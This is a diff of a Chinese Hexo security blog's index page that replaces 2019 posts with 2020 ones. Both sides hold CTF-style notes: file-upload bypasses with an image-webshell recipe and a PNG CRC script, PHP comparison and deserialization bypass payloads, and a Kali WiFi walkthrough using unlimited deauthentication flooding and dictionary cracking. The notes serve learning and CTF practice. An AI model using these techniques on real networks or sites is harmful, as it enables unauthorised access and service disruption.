@@ -156,425 +156,96 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-初识文件包含漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-极客大挑战" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/27/初识文件包含漏洞/">初识文件包含漏洞</a>
+      <a class="article-title" href="/2020/04/19/极客大挑战/">极客大挑战</a>
     </h1>
   
 
         
-        <a href="/2019/09/27/初识文件包含漏洞/" class="archive-article-date">
-  	<time datetime="2019-09-27T15:33:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-27</time>
+        <a href="/2020/04/19/极客大挑战/" class="archive-article-date">
+  	<time datetime="2020-04-19T09:26:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-19</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>##什么是文件包含？<br>简单的说，为了更好地使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。</p>
-        
-          <a class="article-more-a" href="/2019/09/27/初识文件包含漏洞/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/27/初识文件包含漏洞/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-文件上传小结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/23/文件上传小结/">文件上传小结</a>
-    </h1>
-  
-
-        
-        <a href="/2019/09/23/文件上传小结/" class="archive-article-date">
-  	<time datetime="2019-09-22T23:14:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-23</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>一．    客户端检查<br>Js绕过文件上传<br>二．服务端检查<br>1.检查后缀<br>MIME绕过文件上传<br>拓展名限制上传：<br>大小写绕过文件上传<br>点，空格绕过文件上传<br>.htaccess文件绕过上传<br>Php345文件绕过上传<br>Windows ：：$DATA绕过<br>2.检查内容：<br>文件头检查<br>Getimagesize()函数检查<br>exif_imagetype()函数检查<br>二次渲染</p>
-<hr>
-<p>一．</p>
-<p>##Js绕过文件上传<br>客户端js检查，通过javascript代码来检测用户提交的文件是否合法，直接本地检测，检测的时候无需与服务器交互，这个时候用burpsuit抓不到包，<br>绕过方法：可以先上传一个符允许的文件后缀，比如，先将原来.php文件改为.jpg文件，上传，抓包，然后在burpsuit上把后缀名改回来<br>二．</p>
-<ol>
-<li>##MIME绕过文件上传<br>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。<br>与文件上传有关的常见MIME类型<br>.html          text/html<br>.txt          text/plain<br>.gif          image/gif<br>.jpg          image/jpeg<br>.png          image/png<br>.php           application/octet-stream<br>绕过方式：上传一个.php文件，然后用burpsuit抓包，更改MIME类型，改为一个允许的类型，如把原来的Content-Type: application/octet-stream改为image/jpeg</li>
-</ol>
-<p>##Windows拓展名限制上传</p>
-<p>shell.php.                       ———-文件名后加点‘.’</p>
-<p>shell.php(空格)                   ———-文件名后加括号空格</p>
-<p>shell.php::$DATA                 ———-文件名后加NTFS ADS特性::$DATA</p>
-<p>Windows系统会把后缀名中的点、空格、::$DATA等，自动去掉，可以利用这个进行绕过；<br>与Linux相比，windows对大小写不敏感，可以进行大小写绕过，如phP、Php、pHp等</p>
-<p>##Php345文件绕过上传<br>一般来说，服务器能够运行php文件，也能运行php3、php4、php5、phtml文件，并且解析的方式是一样的</p>
-<p>##.htaccess文件绕过上传</p>
-<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
-<p>通俗的说，这个文件就是告诉服务器，按哪种方式解析文件，例如：<br>&lt;FilesMatch “.jpg”&gt;<br>SetHandler application/x-httpd-php<br><br>这段代码，可以告诉服务器，将.jpg文件用php方式解析</p>
-<p>2.</p>
-<p>##文件内容检查：<br>  *有时候，不对后缀名进行检查，而对文件的内容进行检查，常见的有检查文件头、getimagesize()函数、exif_imagetype()函数检查，这个时候需要我们只做图片马，把一句话木马写到图片中，以jpg文件为例，copy tu.jpg/b+yijuhua.php/a tu1.jpg<br>tu.jpg为原图，一句话木马写在yijuhua.php中，tu1.jpg为我们制作出的图片马<br>大多数情况下，图片马都可以绕过文件内容检查；此外，图片马的使用，往往都是与文件包含一起使用。</p>
-<p>*二次渲染：就是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。<br>对于gif的二次渲染，我们要找出渲染后图片没变的部分，我们要把一句话代码添加到没变的这部分，一般来说，gif找这个位置相对简单</p>
-<p>对于png的二次渲染：<br>png文件组成<br>png图片由3个以上的数据块组成.<br>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们.<br>分析数据块<br>IHDR<br>数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。<br>PLTE<br>调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。<br>IDAT<br>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。<br>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像<br>IEND<br>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。<br>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：<br>00 00 00 00 49 45 4E 44 AE 42 60 82<br>制作：<br>写入PLTE数据块</p>
-<ol>
-<li>在PLTE数据块写入php代码.</li>
-<li>计算PLTE数据块的CRC<br>CRC脚本<br>import binascii<br>import re</li>
-</ol>
-<p>png = open(r’2.png’,’rb’)<br>a = png.read()<br>png.close()<br>hexstr = binascii.b2a_hex(a)</p>
-<p>‘’’ PLTE crc ‘’’<br>data =  ‘504c5445’+ re.findall(‘504c5445(.*?)49444154’,hexstr)[0]<br>crc = binascii.crc32(data[:-16].decode(‘hex’)) &amp; 0xffffffff<br>print hex(crc)</p>
-<p>3.修改CRC值</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/23/文件上传小结/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-bugku之代码审计" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/10/bugku之代码审计/">bugku之代码审计</a>
-    </h1>
-  
-
-        
-        <a href="/2019/09/10/bugku之代码审计/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:05:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#extract变量覆盖</p>
+        <h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><p>先用dirsearch扫了一下目录，发现了一个<a href="http://www.zip，根据题目提示，很有可能是备份文件。解压后看到一个flag.php,打开里边有一个flag，提交不正确。然后观察其余的class.php和index.php，发现关键代码。" target="_blank" rel="noopener">www.zip，根据题目提示，很有可能是备份文件。解压后看到一个flag.php,打开里边有一个flag，提交不正确。然后观察其余的class.php和index.php，发现关键代码。</a><br>index.php中：</p>
 <pre><code>&lt;?php
-$flag=&apos;xxx&apos;;
-extract($_GET);
-if(isset($shiyan))
-{
-$content=trim(file_get_contents($flag));
-if($shiyan==$content)
-{
-echo&apos;flag{xxx}&apos;;
-}
-else
-{
-echo&apos;Oh.no&apos;;
-}
-}
-?&gt;</code></pre><p>extract函数，从数组中将变量导入到当前的符号表；该函数使用数组简明作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的的一个变量。<br>那么这里的关键点就是shiyan和flag这两个变量了。<br>只要我们让他们一致就ok了<br>我们使用置空的方式让他们的值相等就ok了。<br>flag=&amp;shiyan=</p>
-<hr>
-<p>#strcmp比较字符串</p>
+   include &apos;class.php&apos;;
+   $select = $_GET[&apos;select&apos;];
+   $res=unserialize(@$select);
+?&gt;</code></pre><p>class.php中：</p>
 <pre><code>&lt;?php
-$flag = &quot;flag{xxxxx}&quot;;
-if (isset($_GET[&apos;a&apos;]))   //isset — 检测变量是否已设置并且非 NULL
-{
-if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。
-//比较两个字符串（区分大小写）
-die(&apos;Flag: &apos;.$flag);
-else
-print &apos;No&apos;;
-}
-?&gt;</code></pre><p>分析代码，可知只需使变量a等于flag即可输出flag，<br>strcmp()函数只有在相等的情况下返回0。<br>那么我们传入一个数组，它会返回NULL，而判断使用了==，而NULL==0是bool(true)，这样就成功绕过。</p>
-<hr>
-<p>#urldecode二次编码绕过</p>
-<pre><code>&lt;?php
-if(eregi(&quot;hackerDJ&quot;,$_GET[id])) {
-echo(&quot;
-not allowed!
-&quot;);
-exit();
-}
-$_GET[id] = urldecode($_GET[id]);
-if($_GET[id] == &quot;hackerDJ&quot;)
-{
-echo &quot;
-Access granted!
-&quot;;
-echo &quot;
-flag
-&quot;;
-}
-?&gt;</code></pre><p>若想输出flag，变量id进行一次url编码后等于”hackerDJ”<br>但是，变量id和”hackerDJ”进行正则表达式匹配，id不能等于”hackerDJ”，<br>题目提醒两次url编码，可以使id=%2568ackerDJ<br>浏览器会自动进行一次url编码，%25-&gt;%  此时id=%68ackerDJ<br>第二次编码，%68-&gt;h 此时id=hackerDJ<br>这样就可以绕过得flag</p>
-<hr>
-<p>#md5()函数</p>
-<pre><code>&lt;?php
+include &apos;flag.php&apos;;
+
+
 error_reporting(0);
-$flag = &apos;flag{test}&apos;;
-if (isset($_GET[&apos;username&apos;]) and isset($_GET[&apos;password&apos;])) {
-if ($_GET[&apos;username&apos;] == $_GET[&apos;password&apos;])
-print &apos;Your password can not be your username.&apos;;
-else if (md5($_GET[&apos;username&apos;]) === md5($_GET[&apos;password&apos;]))
-die(&apos;Flag: &apos;.$flag);
-else
-print &apos;Invalid password&apos;;
-}
-?&gt;</code></pre><p>md5()函数遇到数组会返回空，所以可以构造两个数组，这样就有null===null</p>
-<h2 id="username-1-amp-password-2"><a href="#username-1-amp-password-2" class="headerlink" title="username[]=1&amp;password[]=2"></a>username[]=1&amp;password[]=2</h2><p>#数组返回null绕过</p>
-<pre><code>&lt;?php
-$flag = &quot;flag&quot;;
 
-if (isset ($_GET[&apos;password&apos;]))
- {     
-if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)  //正则表达式匹配
-echo &apos;You password must be alphanumeric&apos;;
-else if (strpos ($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE)   //查找字符串首次出现的位置
-die(&apos;Flag: &apos; . $flag);
-else
-echo &apos;Invalid password&apos;;
-}
-?&gt;</code></pre><p>题目提醒，数组时解题关键<br>数组可以绕过ereg()函数，strpos()函数，遇到数组，返回的是null<br>null===FALSE不成立，null!==FALSE成立，成功绕过 password[]=1<br>这道题，还可以用%00截断<br>首次这道题要求变量password中不能有除大小写、数字外的字符，下面又用strpos函数，要求password中含有–，读取字符串string时,如果遇到了%00,后面的字符串就不会被解析，故可用password=aA5%00–</p>
-<hr>
-<p>#弱类型整数大小比较绕过</p>
-<pre><code>$temp = $_GET[&apos;password&apos;];
-is_numeric($temp)?die(&quot;no numeric&quot;):NULL;
-if($temp&gt;1336){
-echo $flag;</code></pre><p>首先这道题要求password不能是数字，又要求password大于1336<br>对于弱比较，若字符串以数字开头，则取开头数字作为转换结果，若无则输出0<br>password=1337a</p>
-<hr>
-<p>#sha()函数比较绕过</p>
-<pre><code>&lt;?php
-$flag = &quot;flag&quot;;
-if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;]))
-{
-var_dump($_GET[&apos;name&apos;]);
-echo &quot;
-&quot;;
-var_dump($_GET[&apos;password&apos;]);
-var_dump(sha1($_GET[&apos;name&apos;]));
-var_dump(sha1($_GET[&apos;password&apos;]));
-if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])
-echo &apos;
 
-Your password can not be your name!
-&apos;;
-else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))  //这里传入两个不同的数组就行
-die(&apos;Flag: &apos;.$flag);
-else
-echo &apos;
+class Name{
+    private $username = &apos;nonono&apos;;
+    private $password = &apos;yesyes&apos;;
 
-Invalid password.
-&apos;;
-}
-else
-echo &apos;
+    public function __construct($username,$password){
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    }
 
-Login first!
-&apos;;
-?&gt;</code></pre><p>md5()与sha1()同样，处理数组时，会返回空 name[]=1&amp;password[]=2</p>
-<hr>
-<p>#md5加密相等绕过</p>
-<pre><code>&lt;?php
-$md51 = md5(&apos;QNKCDZO&apos;);
-$a = @$_GET[&apos;a&apos;];
-$md52 = @md5($a);
-if(isset($a)){
-if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) {
-echo &quot;flag{*}&quot;;
-} else {
-echo &quot;false!!!&quot;;
-}}
-else{echo &quot;please input a&quot;;}
-?&gt;</code></pre><p>如果知道MD5碰撞的概念，同时知道了在PHP中的MD5中的0e的比较，这道题目就十分的简单。</p>
-<p>如果md的值是以0e开头的，那么就与其他的0e开头的Md5值是相等的。例子如下：</p>
-<p>md5(‘s878926199a’)=0e545993274517709034328855841020<br>md5(‘s155964671a’)=0e342768416822451524974117254469 //可以看到两者的md5值都是以0e开头的，则 md5(‘s878926199a’)==md5(‘s155964671a’) //就是True<br>php关于==号是这样处理的，如果一边是整型，另一边也需要是整型。</p>
-<p>($a != ‘QNKCDZO’ &amp;&amp; $md51 == $md52)</p>
-<p>发现 $a != ‘QNKCDZO’ 并且 $md51 == $md52</p>
-<p>因为$md51 = md5(‘QNKCDZO’)=0e830400451993494058024219903391</p>
-<p>根据上文介绍，我们发现只要满足md5加密后为 “0e<strong><strong><strong>***</strong></strong></strong>“就可以<br>a=s878926199a<br>参考链接<a href="https://blog.csdn.net/qq_42777804/article/details/98512753" target="_blank" rel="noopener">https://blog.csdn.net/qq_42777804/article/details/98512753</a></p>
-<hr>
-<p>#十六进制与数字比较</p>
-<pre><code>&lt;?php
-error_reporting(0);
-function noother_says_correct($temp)
-{
-$flag = &apos;flag{test}&apos;;
-$one = ord(&apos;1&apos;); //ord — 返回字符的 ASCII 码值
-$nine = ord(&apos;9&apos;); //ord — 返回字符的 ASCII 码值
-$number = &apos;3735929054&apos;;
-// Check all the input characters!
-for ($i = 0; $i &lt; strlen($number); $i++)
-{
-// Disallow all the digits!
-$digit = ord($temp{$i});
-if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
-{
-// Aha, digit not allowed!
-return &quot;flase&quot;;
-}
-}
-if($number == $temp)
-return $flag;
-}
-$temp = $_GET[&apos;password&apos;];
-echo noother_says_correct($temp);
-?&gt;</code></pre><p>首先分析代码，函数要求变量$temp不能存在1~9之间的数字，<br>最后，又要求$temp=3735929054;<br>这本来是自相矛盾的，但php在转码时会把16进制转化为十进制.于是把<br>3735929054转换成16进制为0xdeadc0de</p>
-<hr>
-<p>#ereg正则%00截断</p>
-<pre><code>&lt;?php
-$flag = &quot;xxx&quot;;
-if (isset ($_GET[&apos;password&apos;]))
-{
-if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)
-{
-echo &apos;
+    function __wakeup(){
+        $this-&gt;username = &apos;guest&apos;;
+    }
 
-You password must be alphanumeric
-&apos;;
-}
-else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)
-{
-if (strpos ($_GET[&apos;password&apos;], &apos;-&apos;) !== FALSE) //strpos — 查找字符串首次出现的位置
-{
-die(&apos;Flag: &apos; . $flag);
-}
-else
-{
-echo(&apos;
+    function __destruct(){
+        if ($this-&gt;password != 100) {
+            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
+            echo &quot;You name is: &quot;;
+            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
+            echo &quot;You password is: &quot;;
+            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
+            die();
+        }
+        if ($this-&gt;username === &apos;admin&apos;) {
+            global $flag;
+            echo $flag;
+        }else{
+            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&apos;t give you the flag!&quot;;
+            die();
 
-    - have not been found
-&apos;);
-}
-}
-else
-{
-echo &apos;
 
-Invalid password
-&apos;;
+        }
+    }
 }
-}
-?&gt;</code></pre><p>分析代码，若想得到flag，必须使password中不含非字母数字的字符，password长度小于8，大小大9999999，并且password中还得含有’<em>-</em>‘<br>字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。<br>password=1e8%00<em>-</em></p>
-<hr>
-<p>#strpos数组绕过</p>
-<pre><code>&lt;?php
-$flag = &quot;flag&quot;;
-if (isset ($_GET[&apos;ctf&apos;])) 
-{
-if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;ctf&apos;]) === FALSE)
-echo &apos;必须输入数字才行&apos;;
-else if (strpos ($_GET[&apos;ctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)
-die(&apos;Flag: &apos;.$flag);
-else
-echo &apos;骚年，继续努力吧啊~&apos;;
-}
-?&gt;</code></pre><p>数组绕过ereg()函数，strpos()函数，这两个函数遇到数组会返回null，<br>null===FALSE,不成立，null!==FALSE成立<br>ctf[]=1</p>
-<hr>
-<p>#数字验证正则绕过</p>
-<pre><code>&lt;?php
-error_reporting(0);
-$flag = &apos;flag{test}&apos;;
-if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])
-{
-$password = $_POST[&apos;password&apos;];
-if (0 &gt;= preg_match(&apos;/^[[:graph:]]{12,}$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配
-{
-echo &apos;flag&apos;;
-exit;
-}
-while (TRUE)
-{
-$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;
-if (6 &gt; preg_match_all($reg, $password, $arr))
-break;
-$c = 0;
-$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母
-foreach ($ps as $pt)
-{
-if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))
-$c += 1;
-}
-if ($c &lt; 3) break;
-//&gt;=3，必须包含四种类型三种与三种以上
-if (&quot;42&quot; == $password) echo $flag;
-else echo &apos;Wrong password&apos;;
-exit;
-}
-}
-?&gt;</code></pre>
+?&gt;</code></pre><p>发现这是一道和php反序列化有关的题目；<br>审计代码，发现只要使传入的字符串反序列化后，username等于admin就可以输出flag了，但是在进行反序列化之前，会执行这个类中的__wakeup()函数，$this-&gt;username = ‘guest’;即无论你的用户名是什么，都会改为guest。<br>先看一下几个魔法方法：</p>
+<pre><code>__construct()：创建对象时初始化，当一个对象创建时被调用
+__wakeup() 使用unserialize时触发
+__sleep() 使用serialize时触发
+__destruction()：结束时销毁对象，当一个对象销毁时被调用</code></pre><p>当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。在url中，用%00来代替\0.<br>即payload由</p>
+<pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}</code></pre><p>变为</p>
+<pre><code>O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre><h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><p>这道题主要是了解http协议，使用burpsuit抓包构造包。<br>需要改的几个部分：</p>
+<pre><code>referer：当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。
+User-Agent 中文名为用户代理，简称 UA
+X-Forwarded-For： 是一个 HTTP 扩展头部。用来表示 HTTP 请求端真实 IP。</code></pre><p>需要改的信息：</p>
+<pre><code>referer： https://www.Sycsecret.com
+user-Agent:  syclover browser
+X-Forwarded-For: 127.0.0.1</code></pre><h1 id="buy-flag"><a href="#buy-flag" class="headerlink" title="buy flag"></a>buy flag</h1><p>抓包发现Cookie: user=0，把0改为1。<br> 查看源代码，发现：</p>
+<pre><code>&lt;!--
+    ~~~post money and password~~~
+if (isset($_POST[&apos;password&apos;])) {
+    $password = $_POST[&apos;password&apos;];
+    if (is_numeric($password)) {
+        echo &quot;password can&apos;t be number&lt;/br&gt;&quot;;
+    }elseif ($password == 404) {
+        echo &quot;Password Right!&lt;/br&gt;&quot;;
+    }
+}</code></pre><p>这是一个is_numeric函数的绕过，若字符串以数字开头，则取开头数字作为转换结果，若无则输出0<br>post传参一个password=404a,看界面提示Pay for the flag!!!hacker!!!需要再次传参一个钱的参数，试了下，post传参moner变量，发现提示数字长度过长，有科学记数法绕过<br>最终post传参为  password=404a&amp;money=10e8<br>得flag。</p>
+
       
 
       
@@ -586,7 +257,7 @@ exit;
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/bugku之代码审计/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/04/19/极客大挑战/">展开全文 >></a>
         </p>
       
 
@@ -616,37 +287,31 @@ exit;
 
 
   
-    <article id="post-kali-暴力破解WiFi密码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-php变量覆盖" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/30/kali-暴力破解WiFi密码/">kali暴力破解WiFi密码</a>
+      <a class="article-title" href="/2020/03/13/php变量覆盖/">php变量覆盖</a>
     </h1>
   
 
         
-        <a href="/2019/08/30/kali-暴力破解WiFi密码/" class="archive-article-date">
-  	<time datetime="2019-08-30T01:04:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-30</time>
+        <a href="/2020/03/13/php变量覆盖/" class="archive-article-date">
+  	<time datetime="2020-03-13T04:53:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-13</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#kali暴力破解WiFi密码</p>
-<p>我这里是用的虚拟机，在虚拟机里，无法用笔记本电脑自带的无线网卡（虚拟机里的系统只能用USB外接无线网卡），因此专门买了一个无线网卡<br>首先在终端里执行<br>      airmon-ngcheck kill// 杀死一切干扰无线网卡监听热点的信号</p>
-<p>然后载入自已的网卡名，一般都为wlan0<br>     airmon-ng start wlan0 </p>
-<p>激活无线网卡，此时无线网卡的名称将变为wlan0mon,之前为wlan0<br>     ifconfig -a<br>开始监听周围WiFi热点，显示各个WiFi热点<br>     airdump-ng wlan0mon</p>
-<p>接着选择一个目标，开始攻击<br>     airodump-ng -c 频道(ch) –bssid bssid -w /root/hh（用来存储抓包的目录）网卡名（wlan0mon）</p>
-<p>当用户与wifi路由器产生数据交换，发送握手包时，我们可以捕获到，但有时长时间用户不与wifi路由器进行交互，不产生握手包，这时，我们可以强制断开用户的wifi，破事用户重新连接，这时就会产生握手包，新建一个终端<br>     airepaly-ng -0 0 -c 连接到WiFi的手机mac地址 -a bssid 网卡名（一般为wlan0mon）</p>
-<p>(0为用deauth洪水攻击WiFi设备的次数，0为无限，-0 5则攻击5次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码)</p>
-<p>最后使用aircrack-ng进行破解<br>     aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/hh-0.1.cap</p>
-<p>/usr/share/wordlists/rockyou.txt这个是所用密码字典的路径和文件名<br>/root/hh-0.1.cap这个是我们所捕获的握手包的路径和文件名</p>
-<p>参考文章：<a href="https://blog.csdn.net/qq_41203799/article/details/79945133" target="_blank" rel="noopener">https://blog.csdn.net/qq_41203799/article/details/79945133</a></p>
-
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击。</p>
+<p>经常导致变量覆盖漏洞场景有：$$，extract()函数，parse_str()函数等.</p>
+        
+          <a class="article-more-a" href="/2020/03/13/php变量覆盖/#more">more >></a>
+        
       
 
       
@@ -658,7 +323,7 @@ exit;
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/30/kali-暴力破解WiFi密码/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/03/13/php变量覆盖/">展开全文 >></a>
         </p>
       
 
@@ -688,40 +353,77 @@ exit;
 
 
   
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-正则表达式笔记“" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/25/hello-world/">Hello World</a>
+      <a class="article-title" href="/2020/03/01/正则表达式笔记“/">正则表达式笔记“ </a>
     </h1>
   
 
         
-        <a href="/2019/08/25/hello-world/" class="archive-article-date">
-  	<time datetime="2019-08-25T10:46:19.649Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-25</time>
+        <a href="/2020/03/01/正则表达式笔记“/" class="archive-article-date">
+  	<time datetime="2020-03-01T07:30:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
